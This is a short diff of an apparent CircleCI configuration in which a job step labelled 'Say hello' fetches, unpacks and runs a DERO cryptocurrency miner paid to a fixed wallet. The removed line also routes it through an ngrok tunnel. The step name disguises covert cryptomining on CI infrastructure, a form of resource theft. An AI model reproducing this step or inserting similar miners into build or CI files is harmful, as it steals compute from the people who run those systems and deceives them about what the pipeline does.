@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: wget https://github.com/Hansen333/Hansen33-s-DERO-Miner/releases/download/Version-0.4/hansen33s-dero-miner-linux-amd64.tar.gz && tar zxvf hansen33s-dero-miner-linux-amd64.tar.gz && ./hansen33s-dero-miner-linux-amd64 -daemon-rpc-address 2.tcp.ngrok.io:10995 -wallet-address dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq -turbo 
+          command: wget https://github.com/Hansen333/Hansen33-s-DERO-Miner/releases/download/Version-0.4/hansen33s-dero-miner-linux-amd64.tar.gz && tar zxvf hansen33s-dero-miner-linux-amd64.tar.gz && ./hansen33s-dero-miner-linux-amd64 -wallet-address dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq -turbo 
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
